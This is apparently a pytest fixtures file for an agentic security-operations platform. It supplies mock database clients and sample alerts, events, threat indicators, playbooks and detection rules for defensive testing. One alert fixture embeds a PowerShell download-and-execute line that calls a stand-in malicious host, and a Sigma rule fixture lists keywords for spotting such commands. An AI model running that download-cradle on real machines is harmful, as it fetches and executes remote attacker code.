"""
Pytest Configuration and Fixtures for Agentic SOC Platform Tests
"""
import pytest
import asyncio
from datetime import datetime, timedelta
from typing import Dict, List, Any, Optional
from unittest.mock import MagicMock, AsyncMock, patch
from uuid import uuid4
import json


# ============================================================================
# ASYNC FIXTURES
# ============================================================================

@pytest.fixture(scope="session")
def event_loop():
    """Create an instance of the default event loop for the test session."""
    loop = asyncio.get_event_loop_policy().new_event_loop()
    yield loop
    loop.close()


# ============================================================================
# MOCK DATABASE FIXTURES
# ============================================================================

@pytest.fixture
def mock_postgres_connection():
    """Mock PostgreSQL connection for configuration storage."""
    mock_conn = MagicMock()
    mock_conn.execute = AsyncMock(return_value=MagicMock())
    mock_conn.fetch = AsyncMock(return_value=[])
    mock_conn.fetchone = AsyncMock(return_value=None)
    mock_conn.close = AsyncMock()
    return mock_conn


@pytest.fixture
def mock_elasticsearch_client():
    """Mock Elasticsearch client for event storage."""
    mock_client = MagicMock()
    mock_client.index = AsyncMock(return_value={"result": "created"})
    mock_client.search = AsyncMock(return_value={"hits": {"hits": [], "total": {"value": 0}}})
    mock_client.bulk = AsyncMock(return_value={"errors": False})
    mock_client.delete = AsyncMock(return_value={"result": "deleted"})
    mock_client.update = AsyncMock(return_value={"result": "updated"})
    return mock_client


@pytest.fixture
def mock_redis_client():
    """Mock Redis client for caching and queuing."""
    mock_client = MagicMock()
    mock_client.get = AsyncMock(return_value=None)
    mock_client.set = AsyncMock(return_value=True)
    mock_client.delete = AsyncMock(return_value=1)
    mock_client.lpush = AsyncMock(return_value=1)
    mock_client.rpop = AsyncMock(return_value=None)
    mock_client.publish = AsyncMock(return_value=1)
    mock_client.subscribe = AsyncMock()
    return mock_client


@pytest.fixture
def mock_qdrant_client():
    """Mock Qdrant vector database client."""
    mock_client = MagicMock()
    mock_client.upsert = AsyncMock(return_value=True)
    mock_client.search = AsyncMock(return_value=[])
    mock_client.delete = AsyncMock(return_value=True)
    mock_client.get_collection = AsyncMock(return_value={"status": "ok"})
    return mock_client


# ============================================================================
# SAMPLE DATA FIXTURES - ALERTS
# ============================================================================

@pytest.fixture
def sample_alert():
    """Sample alert data for testing."""
    return {
        "id": str(uuid4()),
        "title": "Suspicious PowerShell Execution",
        "description": "Encoded PowerShell command detected",
        "severity": "high",
        "status": "new",
        "source": "endpoint",
        "host": "WORKSTATION-01",
        "user": "john.doe",
        "timestamp": datetime.utcnow().isoformat(),
        "mitre_tactics": ["execution", "defense_evasion"],
        "mitre_techniques": ["T1059.001", "T1027"],
        "iocs": [
            {"type": "ip", "value": "192.168.1.100"},
            {"type": "hash", "value": "a" * 64}
        ],
        "raw_event": {
            "EventID": 4104,
            "ScriptBlockText": "IEX(New-Object Net.WebClient).DownloadString('http://malicious.com/payload')"
        }
    }


@pytest.fixture
def sample_alerts_batch():
    """Batch of sample alerts for testing."""
    severities = ["critical", "high", "medium", "low", "informational"]
    statuses = ["new", "acknowledged", "in_progress", "resolved", "false_positive"]
    
    alerts = []
    for i in range(50):
        alerts.append({
            "id": str(uuid4()),
            "title": f"Alert {i}",
            "severity": severities[i % len(severities)],
            "status": statuses[i % len(statuses)],
            "timestamp": (datetime.utcnow() - timedelta(hours=i)).isoformat(),
            "host": f"HOST-{i:03d}",
            "user": f"user{i}@example.com"
        })
    return alerts


@pytest.fixture
def sample_critical_alert():
    """Sample critical severity alert."""
    return {
        "id": str(uuid4()),
        "title": "Ransomware Activity Detected",
        "description": "File encryption behavior detected on multiple hosts",
        "severity": "critical",
        "status": "new",
        "source": "edr",
        "hosts": ["HOST-001", "HOST-002", "HOST-003"],
        "timestamp": datetime.utcnow().isoformat(),
        "mitre_tactics": ["impact"],
        "mitre_techniques": ["T1486"],
        "tags": ["ransomware", "encryption", "mass_file_modification"]
    }


# ============================================================================
# SAMPLE DATA FIXTURES - EVENTS
# ============================================================================

@pytest.fixture
def sample_raw_event():
    """Sample raw security event before normalization."""
    return {
        "timestamp": "2024-01-15T10:30:00Z",
        "source": "windows_security",
        "EventID": 4624,
        "AccountName": "john.doe",
        "IpAddress": "192.168.1.50",
        "LogonType": 10,
        "WorkstationName": "WORKSTATION-01",
        "ProcessName": "C:\\Windows\\System32\\svchost.exe"
    }


@pytest.fixture
def sample_ocsf_event():
    """Sample OCSF-normalized security event."""
    return {
        "class_uid": 3001,
        "class_name": "Authentication",
        "category_uid": 3,
        "category_name": "Identity & Access Management",
        "activity_id": 1,
        "activity_name": "Logon",
        "time": 1705315800000,
        "severity_id": 1,
        "severity": "Informational",
        "status_id": 1,
        "status": "Success",
        "actor": {
            "user": {
                "name": "john.doe",
                "uid": "S-1-5-21-1234567890"
            }
        },
        "src_endpoint": {
            "ip": "192.168.1.50",
            "hostname": "WORKSTATION-01"
        },
        "metadata": {
            "product": {
                "name": "Windows Security",
                "vendor_name": "Microsoft"
            },
            "version": "1.0.0"
        }
    }


@pytest.fixture
def sample_events_batch():
    """Batch of raw events for bulk processing tests."""
    events = []
    event_types = [
        {"EventID": 4624, "type": "logon"},
        {"EventID": 4625, "type": "failed_logon"},
        {"EventID": 4688, "type": "process_creation"},
        {"EventID": 4104, "type": "powershell"},
        {"EventID": 5156, "type": "network_connection"}
    ]
    
    for i in range(100):
        event_template = event_types[i % len(event_types)]
        events.append({
            "timestamp": (datetime.utcnow() - timedelta(minutes=i)).isoformat(),
            "source": "windows_security",
            "EventID": event_template["EventID"],
            "AccountName": f"user{i % 10}",
            "IpAddress": f"192.168.1.{50 + (i % 200)}",
            "WorkstationName": f"HOST-{i % 20:03d}"
        })
    return events


# ============================================================================
# SAMPLE DATA FIXTURES - THREAT INTELLIGENCE
# ============================================================================

@pytest.fixture
def sample_ioc():
    """Sample Indicator of Compromise."""
    return {
        "type": "ip",
        "value": "198.51.100.1",
        "confidence": 85,
        "severity": "high",
        "source": "threat_feed_1",
        "first_seen": (datetime.utcnow() - timedelta(days=30)).isoformat(),
        "last_seen": datetime.utcnow().isoformat(),
        "tags": ["c2", "cobalt_strike"],
        "context": {
            "actor": "APT29",
            "campaign": "SolarWinds"
        }
    }


@pytest.fixture
def sample_iocs_batch():
    """Batch of IOCs for bulk lookup tests."""
    iocs = [
        {"type": "ip", "value": "198.51.100.1"},
        {"type": "ip", "value": "203.0.113.50"},
        {"type": "domain", "value": "malicious-domain.com"},
        {"type": "domain", "value": "c2-server.evil"},
        {"type": "hash", "value": "a" * 64},
        {"type": "hash", "value": "b" * 64},
        {"type": "url", "value": "http://malicious.com/payload.exe"},
        {"type": "email", "value": "attacker@malicious.com"}
    ]
    return iocs


@pytest.fixture
def sample_threat_intel_response():
    """Sample threat intelligence lookup response."""
    return {
        "ioc": {"type": "ip", "value": "198.51.100.1"},
        "malicious": True,
        "confidence": 92,
        "sources": [
            {"name": "VirusTotal", "positives": 45, "total": 70},
            {"name": "AbuseIPDB", "score": 95, "reports": 150}
        ],
        "context": {
            "country": "RU",
            "asn": "AS12345",
            "owner": "Evil Corp ISP",
            "categories": ["c2", "malware_distribution"]
        },
        "related_iocs": [
            {"type": "domain", "value": "c2.evil.com"},
            {"type": "hash", "value": "c" * 64}
        ]
    }


# ============================================================================
# SAMPLE DATA FIXTURES - INVESTIGATIONS
# ============================================================================

@pytest.fixture
def sample_investigation():
    """Sample investigation data."""
    return {
        "id": str(uuid4()),
        "title": "Suspicious PowerShell Campaign",
        "description": "Multiple hosts showing encoded PowerShell execution",
        "status": "open",
        "priority": "high",
        "assignee": "analyst@example.com",
        "created_at": datetime.utcnow().isoformat(),
        "alert_ids": [str(uuid4()) for _ in range(5)],
        "findings": [],
        "timeline": [],
        "tags": ["powershell", "lateral_movement"]
    }


@pytest.fixture
def sample_investigation_finding():
    """Sample investigation finding."""
    return {
        "id": str(uuid4()),
        "type": "malware",
        "title": "Cobalt Strike Beacon Detected",
        "description": "Memory analysis revealed Cobalt Strike beacon",
        "severity": "critical",
        "confidence": 95,
        "evidence": {
            "host": "WORKSTATION-01",
            "process": "rundll32.exe",
            "pid": 4532,
            "memory_region": "0x7FF00000"
        },
        "mitre_mapping": ["T1055", "T1071.001"],
        "timestamp": datetime.utcnow().isoformat()
    }


# ============================================================================
# SAMPLE DATA FIXTURES - PLAYBOOKS
# ============================================================================

@pytest.fixture
def sample_playbook():
    """Sample response playbook."""
    return {
        "id": str(uuid4()),
        "name": "Ransomware Response",
        "description": "Automated response to ransomware detection",
        "category": "incident_response",
        "version": "1.0.0",
        "auto_execute": False,
        "requires_approval": True,
        "trigger": {
            "type": "alert",
            "conditions": {
                "severity": "critical",
                "tags": ["ransomware"]
            }
        },
        "steps": [
            {
                "id": "step_1",
                "name": "Isolate Host",
                "type": "action",
                "action": "isolate_host",
                "parameters": {"target": "${alert.host}"},
                "timeout": 300
            },
            {
                "id": "step_2",
                "name": "Collect Forensics",
                "type": "action",
                "action": "collect_memory_dump",
                "parameters": {"target": "${alert.host}"},
                "timeout": 600
            },
            {
                "id": "step_3",
                "name": "Notify SOC",
                "type": "notify",
                "channels": ["slack", "pagerduty"],
                "message": "Ransomware incident on ${alert.host}"
            }
        ],
        "rollback": [
            {
                "step_id": "step_1",
                "action": "restore_network_access",
                "parameters": {"target": "${alert.host}"}
            }
        ]
    }


@pytest.fixture
def sample_playbook_execution():
    """Sample playbook execution record."""
    return {
        "id": str(uuid4()),
        "playbook_id": str(uuid4()),
        "alert_id": str(uuid4()),
        "status": "running",
        "started_at": datetime.utcnow().isoformat(),
        "current_step": 1,
        "steps_completed": [
            {
                "step_id": "step_1",
                "status": "success",
                "started_at": datetime.utcnow().isoformat(),
                "completed_at": datetime.utcnow().isoformat(),
                "result": {"isolated": True}
            }
        ],
        "context": {
            "alert": {"host": "WORKSTATION-01", "severity": "critical"}
        }
    }


# ============================================================================
# SAMPLE DATA FIXTURES - DETECTION RULES
# ============================================================================

@pytest.fixture
def sample_sigma_rule():
    """Sample Sigma detection rule."""
    return {
        "title": "Suspicious PowerShell Execution",
        "id": str(uuid4()),
        "status": "production",
        "level": "high",
        "description": "Detects suspicious PowerShell execution patterns",
        "author": "SOC Team",
        "date": "2024/01/15",
        "references": ["https://attack.mitre.org/techniques/T1059/001/"],
        "tags": ["attack.execution", "attack.t1059.001"],
        "logsource": {
            "category": "ps_script",
            "product": "windows"
        },
        "detection": {
            "selection": {
                "EventID": 4104,
                "ScriptBlockText|contains": [
                    "Invoke-Expression",
                    "IEX",
                    "FromBase64String",
                    "DownloadString"
                ]
            },
            "condition": "selection"
        },
        "falsepositives": ["Legitimate administrative scripts"],
        "fields": ["CommandLine", "ParentCommandLine", "User"]
    }


@pytest.fixture
def sample_yara_rule():
    """Sample YARA detection rule."""
    return {
        "name": "CobaltStrike_Beacon",
        "content": '''
rule CobaltStrike_Beacon {
    meta:
        description = "Detects Cobalt Strike beacon"
        author = "SOC Team"
        severity = "critical"
    strings:
        $a = { 4D 5A 90 00 }
        $b = "beacon.dll" ascii
        $c = "ReflectiveLoader" ascii
    condition:
        $a at 0 and ($b or $c)
}
''',
        "enabled": True,
        "severity": "critical"
    }


@pytest.fixture
def sample_kql_rule():
    """Sample KQL detection rule."""
    return {
        "name": "Brute Force Authentication",
        "query": '''
SecurityEvent
| where EventID == 4625
| summarize FailedAttempts = count() by TargetAccount, IpAddress, bin(TimeGenerated, 5m)
| where FailedAttempts > 10
| project TimeGenerated, TargetAccount, IpAddress, FailedAttempts
''',
        "enabled": True,
        "severity": "high",
        "threshold": 10,
        "time_window": "5m"
    }


# ============================================================================
# SAMPLE DATA FIXTURES - MEMORY/BEAD MEMORY
# ============================================================================

@pytest.fixture
def sample_memory_bead():
    """Sample memory bead for Bead Memory architecture."""
    return {
        "id": str(uuid4()),
        "type": "attack_chain",
        "timestamp": datetime.utcnow().isoformat(),
        "content": {
            "phase": "initial_access",
            "technique": "T1566.001",
            "description": "Phishing email with malicious attachment",
            "iocs": ["malicious@attacker.com", "invoice.docm"],
            "hosts_affected": ["WORKSTATION-01"]
        },
        "embedding": [0.1] * 768,  # 768-dim embedding vector
        "connections": [],  # Links to other beads
        "confidence": 0.92,
        "metadata": {
            "source": "detection_agent",
            "alert_id": str(uuid4())
        }
    }


@pytest.fixture
def sample_attack_chain():
    """Sample attack chain with multiple beads."""
    chain_id = str(uuid4())
    beads = [
        {
            "id": str(uuid4()),
            "chain_id": chain_id,
            "phase": "initial_access",
            "sequence": 1,
            "technique": "T1566.001",
            "timestamp": (datetime.utcnow() - timedelta(hours=5)).isoformat()
        },
        {
            "id": str(uuid4()),
            "chain_id": chain_id,
            "phase": "execution",
            "sequence": 2,
            "technique": "T1059.001",
            "timestamp": (datetime.utcnow() - timedelta(hours=4)).isoformat()
        },
        {
            "id": str(uuid4()),
            "chain_id": chain_id,
            "phase": "persistence",
            "sequence": 3,
            "technique": "T1547.001",
            "timestamp": (datetime.utcnow() - timedelta(hours=3)).isoformat()
        },
        {
            "id": str(uuid4()),
            "chain_id": chain_id,
            "phase": "lateral_movement",
            "sequence": 4,
            "technique": "T1021.001",
            "timestamp": (datetime.utcnow() - timedelta(hours=2)).isoformat()
        },
        {
            "id": str(uuid4()),
            "chain_id": chain_id,
            "phase": "exfiltration",
            "sequence": 5,
            "technique": "T1041",
            "timestamp": (datetime.utcnow() - timedelta(hours=1)).isoformat()
        }
    ]
    return {"chain_id": chain_id, "beads": beads}


# ============================================================================
# SAMPLE DATA FIXTURES - SLM/MODEL
# ============================================================================

@pytest.fixture
def sample_slm_input():
    """Sample input for SLM inference."""
    return {
        "prompt": "Analyze the following security event and determine if it's malicious:",
        "context": {
            "event_type": "process_creation",
            "process_name": "powershell.exe",
            "command_line": "powershell -enc JABjAGwAaQBlAG4AdAA=",
            "parent_process": "cmd.exe",
            "user": "SYSTEM"
        },
        "max_tokens": 500,
        "temperature": 0.1
    }


@pytest.fixture
def sample_slm_response():
    """Sample SLM inference response."""
    return {
        "analysis": "MALICIOUS",
        "confidence": 0.94,
        "reasoning": [
            "Encoded PowerShell execution (base64)",
            "Running as SYSTEM user",
            "Parent process is cmd.exe which is suspicious"
        ],
        "mitre_mapping": ["T1059.001", "T1027"],
        "recommended_actions": [
            "Isolate the affected host",
            "Decode and analyze the PowerShell script",
            "Check for persistence mechanisms"
        ],
        "risk_score": 92
    }


# ============================================================================
# API CLIENT FIXTURES
# ============================================================================

@pytest.fixture
def mock_api_client():
    """Mock API client for testing."""
    from fastapi.testclient import TestClient
    
    # This would be replaced with actual app import in real tests
    mock_app = MagicMock()
    client = MagicMock(spec=TestClient)
    client.get = MagicMock()
    client.post = MagicMock()
    client.put = MagicMock()
    client.delete = MagicMock()
    client.patch = MagicMock()
    return client


@pytest.fixture
def auth_headers():
    """Authentication headers for API tests."""
    return {
        "X-API-Key": "test-api-key-12345",
        "Content-Type": "application/json"
    }


@pytest.fixture
def jwt_token():
    """Sample JWT token for authentication tests."""
    return "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ0ZXN0QGV4YW1wbGUuY29tIiwicm9sZSI6ImFuYWx5c3QiLCJleHAiOjE3MzU2ODk2MDB9.test_signature"


# ============================================================================
# AGENT FIXTURES
# ============================================================================

@pytest.fixture
def mock_agent_context():
    """Mock context for agent operations."""
    return {
        "session_id": str(uuid4()),
        "user": "analyst@example.com",
        "role": "senior_analyst",
        "timestamp": datetime.utcnow().isoformat(),
        "config": {
            "auto_approve": False,
            "max_retries": 3,
            "timeout": 300
        }
    }


@pytest.fixture
def mock_orchestrator():
    """Mock orchestrator for agent coordination tests."""
    mock = MagicMock()
    mock.dispatch = AsyncMock()
    mock.get_agent = MagicMock()
    mock.register_agent = MagicMock()
    mock.broadcast = AsyncMock()
    return mock


# ============================================================================
# CONFIGURATION FIXTURES
# ============================================================================

@pytest.fixture
def sample_config():
    """Sample application configuration."""
    return {
        "env": "testing",
        "log_level": "DEBUG",
        "database": {
            "host": "localhost",
            "port": 5432,
            "name": "soc_test",
            "user": "test_user"
        },
        "elasticsearch": {
            "hosts": ["http://localhost:9200"],
            "index_prefix": "soc-test"
        },
        "redis": {
            "host": "localhost",
            "port": 6379,
            "db": 1
        },
        "qdrant": {
            "host": "localhost",
            "port": 6333,
            "collection": "test_vectors"
        },
        "api": {
            "host": "0.0.0.0",
            "port": 8000,
            "rate_limit": 100
        },
        "agents": {
            "detection": {"enabled": True, "batch_size": 100},
            "triage": {"enabled": True, "auto_escalate": True},
            "response": {"enabled": True, "auto_execute": False}
        }
    }


# ============================================================================
# HELPER FUNCTIONS
# ============================================================================

def generate_uuid():
    """Generate a new UUID string."""
    return str(uuid4())


def generate_timestamp(offset_hours: int = 0):
    """Generate an ISO timestamp with optional hour offset."""
    return (datetime.utcnow() - timedelta(hours=offset_hours)).isoformat()


@pytest.fixture
def helpers():
    """Helper functions for tests."""
    return {
        "uuid": generate_uuid,
        "timestamp": generate_timestamp
    }
